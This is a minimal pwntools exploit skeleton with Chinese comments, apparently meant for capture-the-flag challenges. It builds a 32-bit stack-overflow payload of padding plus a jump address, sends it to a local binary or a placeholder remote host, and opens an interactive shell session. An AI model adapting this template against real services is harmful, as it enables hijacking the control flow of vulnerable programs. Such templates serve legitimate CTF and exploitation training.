# -*- coding: utf-8 -*-
"""simple_template 最小化 pwn exp 骨架

来源: https://github.com/SourceLizi/ctf-toolbox (整理成可运行骨架)
用途: 32 位栈溢出等简单题, 从零到 interactive 的最小模板, 填四个标记处即可。

依赖: pip install pwntools
用法: 改 LOCAL_BIN/偏移/地址 后: python simple_template.py   (加 REMOTE 连远程)
"""
from pwn import *

context.arch = 'i386'                    # 64 位改 'amd64'
context.log_level = 'info'

LOCAL_BIN = './pwn'                      # ← 改: 本地 ELF 路径
REMOTE_ADDR = ('node.example.com', 12345)  # ← 改: 远程 ip, port
OFFSET = 32                              # ← 改: 溢出偏移(cyclic 测得)


def start():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        return remote(*REMOTE_ADDR)
    return process(LOCAL_BIN)


def main():
    elf = ELF(LOCAL_BIN, checksec=False)
    io = start()

    backdoor = elf.sym['main']           # ← 改: 要跳转的目标(后门/main)
    payload = flat(
        b'A' * OFFSET,
        0xdeadbeef,                      # ← 改: 32 位时为函数参数地址(可省)
        backdoor,
    )
    io.sendlineafter(b'?', payload)      # ← 改: 实际提示符
    io.interactive()


if __name__ == '__main__':
    main()
